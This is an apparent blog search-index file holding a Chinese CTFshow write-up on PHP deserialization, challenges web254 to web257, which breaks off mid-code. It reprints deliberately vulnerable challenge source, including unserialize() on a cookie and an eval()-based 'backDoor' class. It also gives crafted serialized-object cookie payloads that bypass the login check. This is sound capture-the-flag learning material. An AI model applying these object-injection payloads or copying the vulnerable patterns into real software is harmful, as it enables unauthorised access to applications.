<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFshow之web(六)</title>
      <link href="/2021/08/13/ctfshow-zhi-web-liu/"/>
      <url>/2021/08/13/ctfshow-zhi-web-liu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h1><p><a href="https://www.cnblogs.com/zrp2013/category/491430.html" target="_blank" rel="noopener"><strong>随笔分类 - PHP常识</strong></a></p><p><strong>PHP中的魔术变量：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//执行serialize()时，先会调用这个函数</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将在反序列化之后立即调用（当反序列化时变量个数与实际不符时绕过）</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//当对象被创建时，会触发进行初始化</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//对象被销毁时触发</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>： <span class="token comment" spellcheck="true">//当一个对象被当作字符串使用时触发</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//在对象上下文中调用不可访问的方法时触发</span><span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//在静态上下文中调用不可访问的方法时触发</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//用于将数据写入不可访问的属性</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//在不可访问的属性上调用isset()或empty()触发</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//在不可访问的属性上使用unset()时触发</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//把类当作字符串使用时触发</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//当尝试以调用函数的方式调用一个对象时</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>序列化对象：</strong></p><p><code>private变量会被序列化为：\x00类名\x00变量名protected变量会被序列化为: \x00\*\x00变量名public变量会被序列化为：变量名</code></p><h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"your flag is "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这好像并没有体现出来反序列化，而是简单帮忙了解了一下类，函数的调用，倒是更像代码审计了</p><p><strong>payload：</strong></p><pre><code>?username=xxxxxx&amp;password=xxxxxx</code></pre><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"your flag is "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化的点在cookie的user中，我们需要让$isVip=true</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//运行结果</span>O<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"isVip"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>O<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bb<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre><code>?username=xxxxxx&amp;password=xxxxxxCookie:user=O:11:&quot;ctfShowUser&quot;:1:{s:5:&quot;isVip&quot;%3bb:1%3b}</code></pre><p>记得url编码</p><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//此处多了一个限制需要修改二者其一</span>                    <span class="token keyword">echo</span> <span class="token string">"your flag is "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'yn8rt'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//运行结果</span>O<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"yn8rt"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"isVip"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//url编码处理后：</span>O<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A2</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22yn8rt<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bb<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>yn8rt<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span>user<span class="token operator">=</span>O<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A2</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22yn8rt<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bb<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web257——对象注入"><a href="#web257——对象注入" class="headerlink" title="web257——对象注入"></a>web257——对象注入</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token 